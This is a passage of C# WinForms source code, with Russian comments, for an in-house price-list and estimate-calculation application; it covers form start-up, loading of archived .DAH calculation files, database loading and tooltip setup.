using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.IO.Compression;
using System.Diagnostics;
using Ionic.Zip;
using System.Runtime.InteropServices;
using Excel = Microsoft.Office.Interop.Excel;
using Microsoft.Office.Interop.Excel;
using iTextSharp.text;
using iTextSharp.text.pdf;
using WMPLib;
using System.Threading; // Многопоточный режим! 
using System.Text.RegularExpressions;
using System.Net;
using System.Media;
using System.Net.Sockets;
using load__baze.Models;
using Newtonsoft.Json;





/*
this.tableDataGridView = new DoubleBufferedDataGridView();  
this.dataGridView_зависимость = new DoubleBufferedDataGridView();   
this.dataGridView_расчёт_2 = new DoubleBufferedDataGridView();
this.dataGridView_муляж = new DoubleBufferedDataGridView();    


this.tableDataGridView = new System.Windows.Forms.DataGridView();
this.dataGridView_зависимость = new System.Windows.Forms.DataGridView();  
this.dataGridView_расчёт_2 = new System.Windows.Forms.DataGridView();
this.dataGridView_муляж = new System.Windows.Forms.DataGridView();

               /// времянка для отладки  -ширина строк

                dialog_mess("Start"); - сообщения
                dialog_mess("Stop");

     */

namespace load__baze
{
    public partial class Form1 : Form
    {
        //адрес сайта
        public static string url_praise = "ftp://31.177.95.187";
        public Form1()
        {
            Program.f1 = this;
            InitializeComponent();
            ComboBox comboBox1 = new ComboBox();
            //проверим не открыта ли программа ! Если открыта то закроем! 
            var procList = Process.GetProcesses().Where(p => p.MainWindowHandle != IntPtr.Zero && p.ProcessName != "explorer");
            foreach (Process p in procList)
            {
                comboBox1.Items.Add(p.MainWindowTitle);
                //  "Прайс Дахмиры        источник:\\172.16.10.1\техотдел\baza\baza.mdf"
            }
            if (comboBox1.Items.Count > 0)
            {
                string[] a = new string[comboBox1.Items.Count];
                for (int r = 0; r < comboBox1.Items.Count; r++)
                {
                    a[r] = comboBox1.Items[r].ToString();
                    bool b = false;
                    b = a[r].Contains("Прайс Дахмиры");
                    if (b)
                    {
                        MessageBox.Show("Программа уже открыта!\nРаботайте в ней!", "Так низя!");
                        this.Close();
                    }
                }
            }
            //конец.. проверим не открыта ли программа ! Если открыта то закроем!  
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            dialog_mess("Stop");
            if (nyna_update == true) try { Process.Start(Environment.CurrentDirectory + "\\" + "boot_load.exe"); } catch { }
        }
        public void logotip()
        {
            // Process.Start(@"rez\\timber\\logo.exe",@"\d");
            Process _process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = @"rez\\timber\\logo.exe";
            string istohtik_bazi_отправка = istohtik_bazi.Replace(" ", "▄"); //короче знак пробела этот метод не переносит между программами, потому меняем и там и тут пробелы на квадратик ▄
            startInfo.Arguments = istohtik_bazi_отправка;
            _process.StartInfo = startInfo;
            _process.Start();
            timerlogo1.Enabled = true;
        }

        public string istohtik_bazi = "";
        //переменные для узнавания изменялся ли расчет
        int has_the_calculation_of_the_quantity_changed = 0;
        decimal has_the_price_changed = 0;

        string[] setting = new string[45];//оформлнение
        private void Form1_Load(object sender, EventArgs e)
        {

            Visible = false;
            this.HorizontalScroll.Visible = false; //Прячем полосу прокрутки
            this.VerticalScroll.Visible = false; //прячем полосу прокрутки
            this.AutoScroll = false;


           

            using (StreamReader stream = new StreamReader("theme.dll"))
            {
                int c = 0;
                while (stream.Peek() >= 0)
                {
                    setting[c] = stream.ReadLine();
                    c++;
                }
                stream.Close();
            }

 

            tema(Convert.ToInt16(setting[0]));

             //автообновление чистим хвосты! 
            //1) удаляем файл обновления 
            try { File.Delete(Environment.CurrentDirectory + "\\" + "setup_auto"); } catch { }
            //1) удаляем файл с темпа
            try { Directory.Delete(System.IO.Path.GetTempPath() + "dahmira",true); } catch { }


            FileInfo vvv = new FileInfo(Environment.CurrentDirectory + "\\temp_load\\boot_load.exe");
            if (IsFileLocked(vvv))
            {
                ///нету
            }
            else
            {
                try { File.Delete(Environment.CurrentDirectory + "\\" + "boot_load.exe"); } catch { }
                try { File.Delete(Environment.CurrentDirectory + "\\" + "boot_load.pdb"); } catch { }

                try
                {
                    File.Move(Environment.CurrentDirectory + "\\temp_load\\boot_load.exe", Environment.CurrentDirectory + "\\boot_load.exe");
                }
                catch { }
                try
                {
                    File.Move(Environment.CurrentDirectory + "\\temp_load\\boot_load.pdb", Environment.CurrentDirectory + "\\boot_load.pdb");
                }
                catch { }
                try
                {
                    try { Directory.Delete(Environment.CurrentDirectory + "\\temp_load", true); } catch { }
                }
                catch { }
            }


            //читаем и помещаем файл в add узнаем источник базы сейчас!
            string path = "load__baze.exe.config";
            string[] add = new string[21];
            int a = 0;
            using (StreamReader sr = new StreamReader(path, System.Text.Encoding.UTF8))
            {
                string line;
                while ((line = sr.ReadLine()) != null)
                {
                    add[a] = line;
                    a++;
                }
            }
            string[] words = add[5].Split(new char[] { '=' });
            string aews = "";
            foreach (string s in words)
            {
                aews = words[4];
            }

            string[] words1 = aews.Split(new char[] { ';' });

            foreach (string s in words1)
            {
                istohtik_bazi = words1[0];
            }

            logotip();

            //Проверяем не пытаетя юзер открыть прайс? 

            string put_k_file = "n't";
            try
            {
                // открываем файл
                using (StreamReader stream = new StreamReader("rez\\open_file.faq"))
                {
                    while (stream.Peek() >= 0)
                    {
                        // читаем строку из файла
                        put_k_file = stream.ReadLine();
                    }
                    stream.Close();
                }

            }
            catch { }

            //тут надо удалить файл если он есть!
            //..


            Boolean load_baza = false;
            if (put_k_file != "n't")
            {

                //чистим путь для следующего запуска
                try
                {
                    FileStream fileStream = File.Open("rez\\open_file.faq", FileMode.Create);
                    // получаем поток
                    StreamWriter output = new StreamWriter(fileStream);
                    // записываем текст в поток
                    output.Write("n't");
                    // закрываем поток
                    output.Close();
                }
                catch { }




                //спросим юзера надо ли прайс?

                close_logo = true;

                if (MessageBox.Show("Прайс нужен?", "Привет, надо уточнить!", MessageBoxButtons.YesNo, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification) == System.Windows.Forms.DialogResult.No)
                {//грузим без прайса 

                    load_baza = true; // гасим подключения к прайсу.
                    button_Baza_RACHET.PerformClick();
                    button_Baza_RACHET.Enabled = false;
                    groupBox_baza.Visible = false;
                    groupBox_razhet.Visible = true;
                    загрузитьБазуЗаногоБезСохраненийToolStripMenuItem.Visible = false;
                    сохранитьПрайсToolStripMenuItem.Visible = false;
                    сохранитьПрайсToolStripMenuItem.Enabled = false;
                    перенестиВыделеннуюСтрокуИзРасчеткиВКонецПрайсаToolStripMenuItem.Visible = false;
                    перенестиВсеДанныеИзРасчеткиВКонецПрайсаToolStripMenuItem.Visible = false;
                    button_Baza_RACHET.Text = "РАСЧЁТ > ПРАЙС";
                    вРазработкеСоздатьШаблонToolStripMenuItem.Visible = false;
                    вРазработкеСоздатьШаблонToolStripMenuItem.Enabled = false;
                    сохранитьПрайсToolStripMenuItem.Enabled = false;
                    сохранитьПрайсToolStripMenuItem.Visible = false;
                    загрузитьБазуЗаногоБезСохраненийToolStripMenuItem.Enabled = false;
                    загрузитьБазуЗаногоБезСохраненийToolStripMenuItem.Visible = false;
                    tableBindingNavigator.Visible = false;
                    tableBindingNavigator.Enabled = false;
                }
                else
                {

                    if (Baza == false)
                    { Baza = true; button_Baza_RACHET.Text = "РАСЧЁТ > ПРАЙС"; groupBox_baza.Visible = false; groupBox_razhet.Visible = true; }
                    else { Baza = false; button_Baza_RACHET.Text = "ПРАЙС > РАСЧЁТ"; groupBox_baza.Visible = true; groupBox_razhet.Visible = false; }

                   
                     
                }
                #region грузим без прайса

                otclehivat_polzovatelia = false;
                label_consol_2.Text = "Попытка вставить говницо!";

                System.IO.FileInfo new_put = new System.IO.FileInfo(put_k_file);
                string put_k_arhiv;
                string put_k_papke;
                string put_k_arhiv_zav;
                string gie = new_put.Name;
                string путь = new_put.DirectoryName;
                Directory.CreateDirectory(путь + "\\tempDH");
                //1) распоковывае архив
                using (ZipFile zip1 = new ZipFile(put_k_file, Encoding.GetEncoding(866)))
                {
                    //создаем путь для сохранения
                    char[] MyChar = { '.', 'D', 'A', 'H', ' ' };
                    string Directory1 = put_k_file.TrimEnd(MyChar);
                    put_k_papke = Directory1;
                    System.IO.FileInfo obj = new System.IO.FileInfo(put_k_file); // получаем имя afqkf

                    string name_file = obj.Name.TrimEnd(MyChar);// имя файла без пути! 


                    // put_k_arhiv = Directory1 + "\\" + name_file + ".DAH";
                    //put_k_arhiv_zav = Directory1 + "\\_" + name_file + ".DAH";
                    try { zip1.ExtractAll(Environment.ExpandEnvironmentVariables(@путь + "\\tempDH")); } catch { MessageBox.Show("Рядом с файлом лежит папка с таким же именем ! Удали её и попробуй заново! \n Код ошибки: 001 \nНе смогла распаковать файл по пути: \n" + @путь + " пыталась создать папку \\tempDH"); }
                }

                try
                {
                    string[] все_распок_папки = Directory.GetDirectories(@путь + "\\tempDH"); // путь к папке
                    string papka_c_rasp = все_распок_папки[0];

                    string fdfd12 = путь + "\\tempDH";
                    int fdfd = fdfd12.Length;
                    string путь1 = papka_c_rasp.Substring(fdfd + 1);

                    put_k_arhiv = papka_c_rasp + "\\" + путь1 + ".DAH";
                    put_k_arhiv_zav = papka_c_rasp + "\\_" + путь1 + ".DAH";
                    string put_k_arhiv_PS = papka_c_rasp + "\\_PS_" + путь1 + ".DAH";
                    dataGridView_расчёт_2.Rows.Clear();
                    dataGridView_зависимость.Rows.Clear();
                    textBox_P_S.Text = "";
                    //примечание                   
                    // открываем файл
                    using (StreamReader stream = new StreamReader(put_k_arhiv_PS))
                    {
                        while (stream.Peek() >= 0)
                        {
                            // читаем строку из файла
                            textBox_P_S.Text = stream.ReadLine();
                        }
                        stream.Close();
                    }


                    //грузим основное
                    using (BinaryReader bw = new BinaryReader(File.Open(put_k_arhiv, FileMode.Open)))
                    {
                        int n = bw.ReadInt32();
                        int m = bw.ReadInt32();
                        for (int i = 0; i < m; ++i)
                        {
                            if (i == m)
                            {
                            }
                            if (i < m)
                            {
                                dataGridView_расчёт_2.Rows.Add();
                            }
                            for (int j = 0; j < n; ++j)
                            {
                                if (bw.ReadBoolean())
                                {
                                    if (j != 4) { dataGridView_расчёт_2.Rows[i].Cells[j].Value = bw.ReadString(); }
                                    else
                                    {
                                        string vfsd = bw.ReadString();
                                        try
                                        {
                                            //сюда..
                                            System.Drawing.Image img;
                                            using (var bmpTemp = new Bitmap(@papka_c_rasp + "\\" + i.ToString() + ".jpg"))
                                            {
                                                img = new Bitmap(bmpTemp);
                                            }
                                            dataGridView_расчёт_2.Rows[i].Cells[j].Value = img;
                                        }
                                        catch { }
                                    }
                                }
                                else { bw.ReadBoolean(); }
                            }
                        }
                    }
                    ////грузим зависимости
                    using (BinaryReader bw = new BinaryReader(File.Open(put_k_arhiv_zav, FileMode.Open)))
                    {
                        int n = bw.ReadInt32();
                        int m = bw.ReadInt32();
                        for (int i = 0; i < m; ++i)
                        {
                            if (i == m)
                            {
                            }
                            if (i < m)
                            {
                                dataGridView_зависимость.Rows.Add();
                            }
                            for (int j = 0; j < n; ++j)
                            {
                                if (bw.ReadBoolean())
                                {
                                    dataGridView_зависимость.Rows[i].Cells[j].Value = bw.ReadString();
                                }
                                else { bw.ReadBoolean(); }
                            }
                        }
                    }

                    try { Directory.Delete(@путь + "\\tempDH", true); } catch { }



                    int nr, nc;
                    nc = dataGridView_расчёт_2.Columns.Count; // количество столбцов
                    nr = dataGridView_расчёт_2.RowCount;
                    if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.RowCount - 2].Cells[6].Value != null || dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.RowCount - 2].Cells[7].Value != null) { }
                    else
                    {
                        if ((nc > 0) && (nr > 1))
                        {
                            dataGridView_расчёт_2.Rows.RemoveAt(nr - 2);

                        }
                    }
                    try
                    {
                        int nr1;
                        nr1 = dataGridView_зависимость.RowCount - 1;
                        //       dataGridView_зависимость.Rows.RemoveAt(nr1 - 1);
                    }
                    catch { }
                    if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[0].Value == null
                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[1].Value == null
                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[2].Value == null
                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[3].Value == null
                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[5].Value == null
                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[6].Value != null
                      && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[7].Value != null
                      )
                    {
                        string itigo = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[6].Value.ToString();
                        string thena = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[7].Value.ToString();
                        int nr33, nc33;
                        nc33 = dataGridView_расчёт_2.Columns.Count; // количество столбцов
                        nr33 = dataGridView_расчёт_2.RowCount;
                        if ((nc33 > 0) && (nr33 > 1))
                        {
                            dataGridView_расчёт_2.Rows.RemoveAt(nr33 - 2);
                        }
                        else
                        {
                        }
                        dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[6].Value = itigo;
                        dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[7].Value = thena;
                    }
                    else
                    {
                    }
                    if (dataGridView_расчёт_2.RowCount - 1 > 0)
                    {
                        for (int x = 0; x < dataGridView_зависимость.RowCount - 1; x++)
                        {
                            string id = null;
                            try { id = dataGridView_зависимость.Rows[x].Cells[4].Value.ToString(); } catch { }

                            if (id != null)
                            {
                                for (int n = 0; n < dataGridView_расчёт_2.NewRowIndex; n++)
                                {
                                    string idd = null;
                                    try
                                    {
                                        idd = dataGridView_расчёт_2.Rows[n].Cells[8].Value.ToString();
                                    }
                                    catch { }
                                    if (id == idd)
                                    {  //dataGridView_Заказ[w, q].Style.BackColor = Color.FromArgb(255, 255, 255, 255);
                                        dataGridView_расчёт_2.Rows[n].Cells[0].Style.BackColor = Color.Wheat;
                                    }
                                }
                            }
                        }
                    }
                    try
                    {
                        ///
                        if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8] != null)
                        {
                            dataGridView_муляж.Rows.Clear();
                            string dsd = null;
                            try { dsd = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8].Value.ToString(); } catch { }

                            if (dsd != null)
                            {
                                int nomber = 1;
                                for (int j = 0; j < dataGridView_зависимость.Rows.Count - 1; j++)
                                {
                                    if (dsd == dataGridView_зависимость.Rows[j].Cells[4].Value.ToString())
                                    {
                                        dataGridView_муляж.Rows.Add(nomber.ToString(), dataGridView_зависимость.Rows[j].Cells[0].Value, dataGridView_зависимость.Rows[j].Cells[1].Value, dataGridView_зависимость.Rows[j].Cells[2].Value, dataGridView_зависимость.Rows[j].Cells[3].Value);
                                        nomber++;
                                    }
                                }
                            }
                            else { dataGridView_муляж.Visible = false; groupBox7.Visible = false; }
                        }////
                    }
                    catch { }
                    label_consol_2.Text = "Загружена расчетка";
                    label_rachetka.Text = "Расчет: " + put_k_file;
                    razhet_label.Visible = true;
                }
                catch
                {
                    DialogResult rezult = MessageBox.Show("Невозможно открыть выбранный файл",
                    "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    label_consol_2.Text = "Неполучилось вставить таблицу! бывает.";
                }

                otclehivat_polzovatelia = true;

                #endregion грузим без прайса 

            }









            // данная строка кода позволяет загрузить данные в таблицу "данные.Table". При необходимости она может быть перемещена или удалена.
            try
            {
                label_consol.Text = "Загружается прайс";
                if (load_baza == false)
                {

                    using (var fs = File.Open(istohtik_bazi, FileMode.Open, FileAccess.Read, FileShare.None))
                    {
                        System.IO.FileInfo obj = new System.IO.FileInfo(istohtik_bazi);
                    }


                    this.tableTableAdapter.Fill(this.данные.Table);

                    this.Text = "Прайс Дахмиры        источник:" + istohtik_bazi;
                    label_consol.Text = "Привет, прайс загружен, что будем делать?";

                    nyna_proverca_praise_ftp();
                }
                else
                {
                    вРазработкеСоздатьШаблонToolStripMenuItem.Visible = false;
                    вРазработкеСоздатьШаблонToolStripMenuItem.Enabled = false;
                    сохранитьПрайсToolStripMenuItem.Enabled = false;
                    сохранитьПрайсToolStripMenuItem.Visible = false;
                    загрузитьБазуЗаногоБезСохраненийToolStripMenuItem.Enabled = false;
                    загрузитьБазуЗаногоБезСохраненийToolStripMenuItem.Visible = false;
                    tableBindingNavigator.Visible = false;
                    tableBindingNavigator.Enabled = false;
                    сделатьКопиюПрайсаВToolStripMenuItem.Visible = false;
                    this.Text = "Прайс Дахмиры        НЕТ ИСТОЧНИКА ПРАЙСА!";

                }
            }
            catch
            {

                System.IO.FileInfo obj111 = new System.IO.FileInfo(istohtik_bazi);
                if (Directory.Exists(obj111.Directory.ToString()))
                {

                    label_consol.Text = "Файл прайса занят, кто то тоже сидит, загрузилась без него..";
                    rezult_nuhna_li_bez_praisa = MessageBox.Show("Файл прайса занят, буду грузиться без него! \nАктуальна программа без прайса?",
                    "Ошибка", MessageBoxButtons.YesNo, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);

                }
                else
                {
                    rezult_nuhna_li_bez_praisa = MessageBox.Show("Нет связи с файлом прайса.\nАктуальна программа без прайса?",
                    "Ошибка", MessageBoxButtons.YesNo, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
                    label_consol.Text = "Нет связи с файлом прайса";
                    обновитьЦенуСФайлаExcelToolStripMenuItem.Enabled = false;
                    изменитьНаЦенуПроизводителяToolStripMenuItem.Enabled = false;
                }




                вРазработкеСоздатьШаблонToolStripMenuItem.Visible = false;
                вРазработкеСоздатьШаблонToolStripMenuItem.Enabled = false;
                сохранитьПрайсToolStripMenuItem.Enabled = false;
                сохранитьПрайсToolStripMenuItem.Visible = false;
                загрузитьБазуЗаногоБезСохраненийToolStripMenuItem.Enabled = false;
                загрузитьБазуЗаногоБезСохраненийToolStripMenuItem.Visible = false;
                tableBindingNavigator.Visible = false;
                tableBindingNavigator.Enabled = false;
                сделатьКопиюПрайсаВToolStripMenuItem.Visible = false;
                this.Text = "Прайс Дахмиры        НЕТ ИСТОЧНИКА ПРАЙСА!";

            }

            //убьить пдключение sql
            try
            {
                Process[] proc = Process.GetProcessesByName("sqlservr");
                proc[0].Kill();
            }
            catch
            {
            }

            наименованиеDataGridViewTextBoxColumn.AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
            dataGridViewTextBoxColumn35.AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;


            Visible = true;

            ToolTip й = new ToolTip();
            й.SetToolTip(button_добавить_значение_в_табл, "Дабавить новую строчку с данными \nзаписанными выше в строчках. Если вы много удалили в прайсе \nстрок. То может сильно сбивается порядковый номер.. \nВводить с указанного порядкового номера у вас \nне получится, так как не получится отследить повторы \nпрограммой. И решается это просто. Сохранитесь и перезагрузите \nпрограмму, она заново пересчитает и продолжит добавлять \nпо порядку. ");
            й.SetToolTip(button_new_foto_down, "Добавить изображение из файла. Следите, \nчто б изображение было небольшим!\nРекомендуется не более 400х400px");
            й.SetToolTip(button_del_new_image, "Удалить фото.");
            й.SetToolTip(button_new_foto, "Добавить изображение из буфера памяти.\nДля удобства рекомендую пользоваться программой \nLightshot 5.5 или сочетанием клавишь \nWin + Shift + S 'Фрагмент и набросок'.Если он включен в вашу сборку операционной системы.");
            й.SetToolTip(pictureBox_new_image, "Фото будующего изображения в прайсе.");
            й.SetToolTip(textBox_new_производитель, "Ячейка 'производитель' будующей ячейки в прайсе.");
            й.SetToolTip(textBox_new_наименование, "Ячейка 'наименование' будующей ячейки в прайсе.");

            й.SetToolTip(button_добавить, "Добавить новое в прайс.");
            й.SetToolTip(button_поиск, "Найти в прайсе.");
            й.SetToolTip(textBox_new_артикул, "Ячейка 'артикул' будующей ячейки в прайсе.");
            й.SetToolTip(numericUpDown1, "Ячейка 'цена' будующей ячейки в прайсе, вводите \nтолько цифры, разделитель ЗАПЯТАЯ! не точка!");
            й.SetToolTip(button_поиск_по_баз_доб, "Мне позвонил мой создатель и сказал, \nчто он в беде. Ему срочно нужен кофе.\n Ты не пог бы помочь мне с этим.\nПринеси ему станчик кофе, пожалуйста.");
            й.SetToolTip(checkBox2, "Если установить флажок, то в расcчетке после \nизменение строки маркер сам будет передвигаться \nна позицию ниже!");
            й.SetToolTip(numericUpDown3, "Количество шт, добавляемой строки выбранного изделия из базы.");
            й.SetToolTip(button_поиск_копий_в_базе, "Грызет весть список базы по артикулам, \nи сообщает, нет ли повторов.");
            й.SetToolTip(button_perenos_obratno, "Переносит все значения: производителя,наименования,\nартикула и цены из расчетки в конец прайса.");
            й.SetToolTip(button_ctroky_v_bazy, "Переносит выбранную строку\nиз расчётки в конец прайса.");
            й.SetToolTip(button_расчитать, "Высчитывает итоговую цену и делает частично проверку в расчетке.");
            й.SetToolTip(button_взять_актуальные_цены_с_базы, "Обновить цены с прайса.");
            й.SetToolTip(textBox_new_stolbeth, "Текст раздела в расчётки.");
            й.SetToolTip(button_new_razdel, "Добавить текст в конец расчетки.");
            й.SetToolTip(button_new_razdel_vmesto, "Изменить выделенную строку в расчетке на текст указаный тут.");
            й.SetToolTip(numericUpDown2, "Номер столбца, куда требуется ввести текст.");
            й.SetToolTip(checkBox3, "Еслу установленна галочка, то после изменение строки,\nмаркер внутри таблицы сам опуститься на шаг ниже.");
            й.SetToolTip(button_save_to_pdf3, "Сохраняет в PDF но без цен и если есть что то в P.S. строке,\nто это добавяется внизу страницы после таблички.");
            й.SetToolTip(button_save_to_pdf2, "Сохраняет в PDF расчетку своим кодером.");
            й.SetToolTip(textBox_P_S, "Вставляемое примечание c центра листа, после вставки таблицы.");
            й.SetToolTip(label_consol_2, "Я буду тебе подсказывать об изменениях в расчетке!");
            й.SetToolTip(label_consol, "Я буду тебе подсказывать об изменениях в скачаной таблицы расчёта.");
            й.SetToolTip(button_new_ophins, "Сохраняет в Microsoft Excel документ");
            й.SetToolTip(button_поиск_по_баз_под, "Добавить в расчетку.\nПод выбранной строкой,\nгде сейчас установлен маркер.");
            й.SetToolTip(button_поиск_по_баз_замен, "Изменит в расчетке строку,\nгде сейчас установлен маркер!");
            й.SetToolTip(номерTextBox, "Уникальный номер строке скачанной базы.\n Повторы не допустимы!");
            й.SetToolTip(производительTextBox, "Производитель в строке базы");
            й.SetToolTip(наименованиеTextBox, "Наименование в строке базы.");
            й.SetToolTip(артикулTextBox, "Артикул в строке базы.");
            й.SetToolTip(ценаTextBox, "Цена в строке базы.");
            й.SetToolTip(фотографияPictureBox, "Фотография в строке базы.");
            й.SetToolTip(button1, "Вставить из буфера.");
            й.SetToolTip(button_скриншот, "Сохранить в буфер");
            й.SetToolTip(button_загрузить_изображение, "Вставить из файла.");
            й.SetToolTip(button_сохр_изобр_в_фаил, "Сохранить в файл.");
            й.SetToolTip(button_удалить_изобр_в_фаил, "Удалить фото.");
            й.SetToolTip(button_Calk, "Продвинутый калькулятор.");            
            й.SetToolTip(button_del_razhet, "Удалить выбранную строку");
            й.SetToolTip(button_new_zavisim, "Добавить зависимость");
            й.SetToolTip(button_del_zavisim, "Удалить зависимость");
            й.SetToolTip(button_del_razhet_end, "Удалить последнюю строку");
            й.SetToolTip(button_Baza_RACHET, "Переход между базой и расчёткой");
            й.SetToolTip(comboBox_елупни, "Выбрать цену по имени");
            й.SetToolTip(button4, "Системный калькулятор");
            й.SetToolTip(button_сохранить_расчёт_быстро, "Сохранить расчёт");
            й.SetToolTip(button_расчет_фото_доб, "Загрузить картинку");
            й.SetToolTip(button_расчет_фото_сохранить, "Сохранить картинку");
            й.SetToolTip(button_расчет_фото_из_буфера, "Вставить из буфера");
            й.SetToolTip(button_расчет_фото_в_буфер, "Скопировать в буфер");
            й.SetToolTip(номерTextBox, "Номер выбраной строки.");
            й.SetToolTip(производительTextBox, "Производитель выбраной строки.");
            й.SetToolTip(наименованиеTextBox, "Наименование выбраной строки.");
            й.SetToolTip(артикулTextBox, "Артикул выбраной строки.");
            й.SetToolTip(ценаTextBox, "Цена выбраной строки.");
            й.SetToolTip(comboBox1_поиск, "Производители в прайсе.");
            й.SetToolTip(comboBox_наименование_поиск_по_базе, "Наименование производителя.");
            й.SetToolTip(comboBox_артикул_поиск_по_базе, "Артикулы производителя.");
            й.SetToolTip(comboBox_цена_поиск_по_базе, "Цены производителя.");
            й.SetToolTip(button_расчет_фото_удалить, "Удалить картинку");
            й.SetToolTip(groupBox_razhet, "Настройка цвета формы");
            й.SetToolTip(button2, "Создает раздел над выделением в текущей стоке в расчёта.");
            й.SetToolTip(button_copy, "Копировать строку");
            й.SetToolTip(button_pase, "Вставить под стракой");
            й.SetToolTip(button_new_ophins2, "Вставить листом в существующий Excel");
            й.SetToolTip(button7, "Обновить цены и рассчитать.");
            й.SetToolTip(button_no_image_for_excel, "Фотки в Excel");
            й.SetToolTip(button_asq, "Связь с Командой!");

            й.SetToolTip(button_проверить_url_praise, "Сравнение прайсов, нашего и на сайте ID360");
            й.SetToolTip(button5, "Скачать в рабочий каталог прайс с сайта ID361");
            й.SetToolTip(button_upload_praise_ftp, "Загрузить твою версию праса на сайт ID362");
            й.SetToolTip(button_return_ftp_praise, "Востанавливает предыдущий прайс, один раз! ID363");
            й.SetToolTip(button6, "Окно информации, что на сайте. ID364");
            й.SetToolTip(button8, "История моих телодвижений. ID365");



            dataGridView_муляж.Visible = false;
            groupBox7.Visible = false;

            //radio
            trackBar1.Enabled = false;
            trackBar1.Visible = false;
            выключитьToolStripMenuItem.Enabled = false;
            включитьToolStripMenuItem.Enabled = true;
            сменитьВолнуToolStripMenuItem.Enabled = false;
            pictureBox_Raz1.Image = pictureBox_Raz.Image;
            groupBox_картинка_расчетки.Enabled = false;


            //загрузка коэффициентов для переноса 
            string str = "";
            // открываем файл
            using (StreamReader stream = new StreamReader("settlement.dll"))
            {
                int x = 0;
                while (stream.Peek() >= 0)
                {             
                    str = stream.ReadLine();
                    try { settlement_price[x] = str; } catch { label_consol.Text = "Файл данных о коэффициентах для переноса цен поврежден!"; }
                    x++;
                }
                stream.Close();
            }

            try
            {
                string jsonLocalString = File.ReadAllText("countries.json");
                Manager.Instance.countries = JsonConvert.DeserializeObject<List<Country>>(jsonLocalString);
            }
            catch
            {
                Manager.Instance.countries = new List<Country> { };
            }

            for (int x = 1; x < 16; x++)
            {
                if (settlement_price[x] != "")
                {
                    try { comboBox_елупни.Items.Add(settlement_price[x]); } catch { label_consol.Text = "Файл данных о коэффициентах для переноса цен поврежден!"; }
                }
            }
            try
            {
                int d = Int16.Parse(settlement_price[0]);
                comboBox_елупни.SelectedIndex = Int16.Parse(settlement_price[0]);
                bool isDecimal = Decimal.TryParse(settlement_price[d + 16], out koff_klienty);
                label18.Text = koff_klienty.ToString();
            }
            catch { label_consol.Text = "Файл данных о коэффициентах для переноса цен поврежден!"; }

            this.Size = new Size(1000, 600);
            this.MinimumSize = new Size(1000, 500);
            //  this.MaximumSize = new Size(1920, 1920);

            //Ширина в таблице скрытых столбцов
            dataGridView_муляж.Columns[5].Width = 0;
            try { dataGridView_расчёт_2.Columns[8].Width = 0; } catch { }
            try
            {
                dataGridView_расчёт_2.Columns[9].Width = 0;
            }
            catch { }


            /// времянка для отладки 
            /// времянка для отладки 
            // DataGridViewColumn column11 = dataGridView_расчёт_2.Columns[0]; //закоментируй
            // column11.MinimumWidth = 80; // закоментируй

            DataGridViewColumn column = dataGridView_расчёт_2.Columns[8];
            column.MinimumWidth = 2; // 2


            DataGridViewColumn column1 = dataGridView_расчёт_2.Columns[9];
            column1.MinimumWidth = 2; //2


            DataGridViewColumn column2 = dataGridView_муляж.Columns[5];
            column2.MinimumWidth = 2; //2

            dataGridViewTextBoxColumn36.Width = 120;



            ///кнопки ctrl+F
            searh_button.Click += new System.EventHandler(button_searh);
            searh_text.KeyDown += new System.Windows.Forms.KeyEventHandler(searh_text_Enter);
            searh.KeyDown += new System.Windows.Forms.KeyEventHandler(key_okno);


            //бегущая строка
            timerr.Interval = 190;
            timerr.Tick += this.timerrr_Tick;

            //фото в ексель иконка с и без фото          
            string[] color = new string[15];
            int r = 0;
            using (StreamReader stream = new StreamReader("rez\\Color_excel.txt"))
            {
                while (stream.Peek() >= 0)
                {
                    color[r] = stream.ReadLine();
                    r++;
                }
                stream.Close();
            }
            if (color[6] == "0") button_no_image_for_excel.BackgroundImage = Properties.Resources.с_фото; else button_no_image_for_excel.BackgroundImage = Properties.Resources.без_фото;



            //настройки чата
            chat_Load();
            //закрываем лого
            close_logo = true;

            //сохранение всех поставщиков
            for (int i = 0; i < this.tableBindingSource.Count; i++)
            {
                if (Manager.Instance.allManufacturers.Count > 0)
                {
                    if (tableDataGridView[1, i].Value.ToString() == Manager.Instance.allManufacturers[Manager.Instance.allManufacturers.Count - 1].name)
                    {
                        continue;
                    }
                    else
                    {
                        Manager.Instance.allManufacturers.Add(new Manufacturer { name = tableDataGridView[1, i].Value.ToString() });
                    }
                }
                else
                {
                    Manager.Instance.allManufacturers.Add(new Manufacturer { name = tableDataGridView[1, i].Value.ToString() });
                }
            }
        }



        Boolean close_logo = false;

        private void timerlogo1_Tick(object sender, EventArgs e)
        {

            timerlogo1.Enabled = false;
            timerlogo2.Enabled = true;
        }


        private void timerlogo2_Tick(object sender, EventArgs e)
        {
            if (close_logo == true)
            {
                //закрыть логотип (убить! )
                try
